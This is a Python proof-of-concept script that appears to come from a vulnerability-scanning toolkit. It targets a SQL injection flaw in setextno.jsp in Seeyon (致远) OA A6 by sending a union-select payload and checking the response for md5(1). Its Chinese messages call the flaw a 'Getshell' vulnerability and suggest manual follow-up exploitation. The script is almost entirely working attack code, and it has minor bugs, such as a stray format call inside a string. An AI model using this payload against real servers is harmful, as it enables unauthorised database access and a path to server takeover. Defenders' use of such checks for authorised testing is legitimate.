import time
import requests

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def check(target_url):
    vuln_url = target_url + "yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999)+union+all+select+1,2,(md5(1)),4#"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    success_msg = now_time() + '[SUCCESS]目标存在致远OA A6 setextno.jsp SQL注入Getshell漏洞'
    shell_msg = now_time() + '可尝试手动进一步利用".format(vuln_url)'
    warning_msg = now_time() + '[WARNING]致远OA A6 setextno.jsp SQL注入Getshell漏洞利用失败'
    error_msg = now_time() + '[致远OA A6 setextno.jsp SQL注入Getshell漏洞][ERROR]目标请求失败'
    try:
        response = requests.get(vuln_url, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in response.text:
            return success_msg ,shell_msg
        else:
            return warning_msg
    except:
        return error_msg

def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    requests.packages.urllib3.disable_warnings()
    check(target_url)



